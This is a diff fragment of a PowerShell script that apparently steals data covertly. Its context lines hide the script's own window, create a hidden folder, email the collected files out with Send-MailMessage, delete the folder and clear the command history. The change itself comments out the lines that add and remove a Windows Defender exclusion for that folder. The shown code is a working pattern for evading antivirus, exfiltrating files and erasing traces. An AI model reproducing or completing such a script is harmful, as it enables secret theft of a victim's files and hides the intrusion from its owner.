@@ -85,7 +85,7 @@ Get-Process -ID $PID | Set-WindowState -State HIDE
 $dir = "C:\Users\$env:UserName\Downloads\tmp"
 New-Item -ItemType Directory -Path $dir
 # Add an exception to Windows Defender for the tmp directory
-Add-MpPreference -ExclusionPath $dir
+# Add-MpPreference -ExclusionPath $dir
 #Hide the directory
 $hide = Get-Item $dir -Force
 $hide.attributes='Hidden'
@@ -115,7 +115,7 @@ Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments 
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
 # Set-MpPreference -DisableRealtimeMonitoring $false
-Remove-MpPreference -ExclusionPath $dir
+# Remove-MpPreference -ExclusionPath $dir
 
 # Remove the script from the system
 Clear-History
